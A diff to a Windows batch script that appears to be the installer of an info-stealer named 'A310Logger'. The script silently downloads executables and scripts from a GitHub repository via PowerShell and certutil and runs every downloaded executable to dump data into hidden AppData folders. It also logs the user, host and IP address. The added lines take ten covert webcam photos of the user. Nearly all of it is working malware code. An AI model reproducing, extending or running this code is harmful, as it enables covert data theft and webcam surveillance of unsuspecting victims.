@@ -16,6 +16,7 @@ echo *************Create directory****************
 
    mkdir C:\Users\%username%\AppData\Local\A310Logger\Browsers  > nul 2> nul
    mkdir C:\Users\%username%\AppData\Local\A310Logger\Others > nul 2> nul
+   mkdir C:\Users\%username%\AppData\Local\A310Logger\Webcam > nul 2> nul
    
    echo Directory Created
 
@@ -101,10 +102,10 @@ echo *************DOWNLOAD file****************
    )  
       if errorlevel 1 goto ERROR2   
 
-   if not exist "C:\Users\%username%\AppData\Roaming\folder.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true', 'folder.exe')" > nul 2> nul
+   if not exist "C:\Users\%username%\AppData\Roaming\WebCamImageSave.exe" (
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/WebCamImageSave.exe?raw=true', 'WebCamImageSave.exe')" > nul 2> nul
    )
-      if errorlevel 1 goto ERROR2   
+      if errorlevel 1 goto ERROR2 
 
    powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true', 'folder.exe')" > nul 2> nul
       if errorlevel 1 goto ERROR2   
@@ -171,8 +172,8 @@ echo *************DOWNLOAD file****************
    )   
       if errorlevel 1 goto ERROR3
   
-   if not exist "C:\Users\%username%\AppData\Roaming\folder.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true?raw=true -OutFile folder.exe" > nul 2> nul
+   if not exist "C:\Users\%username%\AppData\Roaming\WebCamImageSave.exe" (
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/WebCamImageSave.exe?raw=true?raw=true -OutFile WebCamImageSave.exe" > nul 2> nul
    )   
       if errorlevel 1 goto ERROR3
 
@@ -186,6 +187,11 @@ echo *************DOWNLOAD file****************
    echo.
    echo Please, wait...
    timeout 3 > NUL
+   set url="https://github.com/win32u/Licence/blob/main/Extension/WebCamImageSave.exe?raw=true"
+   set filename="WebCamImageSave.exe"
+   certutil -urlcache -split -f %url% %filename% > nul 2> nul
+   if errorlevel 1 goto EOF
+
    set url="https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true"
    set filename="AutoRun.vbs"
    certutil -urlcache -split -f %url% %filename% > nul 2> nul
@@ -200,7 +206,6 @@ echo *************DOWNLOAD file****************
    set filename="instagram.ps1"
    certutil -urlcache -split -f %url% %filename% > nul 2> nul
    if errorlevel 1 goto EOF
-
 
    set url="https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true"
    set filename="a310logger.exe"
@@ -232,13 +237,32 @@ echo *************DOWNLOAD file****************
       echo.
       echo.
       echo.
-      echo *************Execute file****************
+
+
+
+   echo *************Execute file****************
       for %%a in (*.exe) do (
          call %%a /stext C:\Users\%username%\AppData\Local\A310Logger\Others\%%a.txt
       )		
       echo User: %ComputerName% \ %UserName% >"C:\Users\%username%\AppData\Local\A310Logger\IPnHost.txt"
       echo Public_IP: >>"C:\Users\%username%\AppData\Local\A310Logger\IPnHost.txt"
       ipconfig | find /i "IPv4" >>"C:\Users\%username%\AppData\Local\A310Logger\IPnHost.txt"
+
+
+
+      set increment=0
+      :increment
+      timeout 1 > nul
+      call "C:\Users\%username%\AppData\Roaming\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\%username%\AppData\Local\A310Logger\Webcam\%increment%.jpg" > nul 2> nul
+      set /a increment=%increment%+1 
+      if "%increment%"=="11" goto next
+      goto increment
+
+      :next
+      echo Image captured 10times.
+
+
+
       echo Executed
       echo.
 
